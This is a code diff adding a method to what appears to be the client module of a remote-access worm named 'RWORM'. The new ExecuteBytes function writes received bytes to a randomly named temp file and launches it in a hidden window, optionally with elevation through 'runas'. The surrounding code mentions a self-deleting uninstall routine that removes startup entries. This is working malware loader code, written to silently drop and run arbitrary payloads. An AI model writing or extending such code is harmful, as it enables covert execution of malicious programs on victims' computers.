@@ -39,6 +39,28 @@ namespace RWORM.Client.Modules
             catch (Exception ex) { return Utf8($"{{\"error\":\"{ex.Message}\"}}"); }
         }
 
+        // Write raw bytes to temp and run it. Returns result JSON bytes.
+        public static byte[] ExecuteBytes(byte[] bytes, string ext = ".exe", bool asAdmin = false)
+        {
+            try
+            {
+                if (string.IsNullOrEmpty(ext)) ext = ".exe";
+                var tmp = Path.Combine(Path.GetTempPath(), $"rworm_ld_{Guid.NewGuid():N}{ext}");
+                File.WriteAllBytes(tmp, bytes);
+
+                var psi = new ProcessStartInfo
+                {
+                    FileName        = tmp,
+                    UseShellExecute = true,
+                    WindowStyle     = ProcessWindowStyle.Hidden,
+                };
+                if (asAdmin) psi.Verb = "runas";
+                Process.Start(psi);
+                return Utf8($"{{\"ok\":true,\"path\":\"{tmp.Replace("\\", "\\\\")}\"}}");
+            }
+            catch (Exception ex) { return Utf8($"{{\"error\":\"{ex.Message}\"}}"); }
+        }
+
         // Delete self from disk, remove startup entries, exit.
         public static void Uninstall()
         {
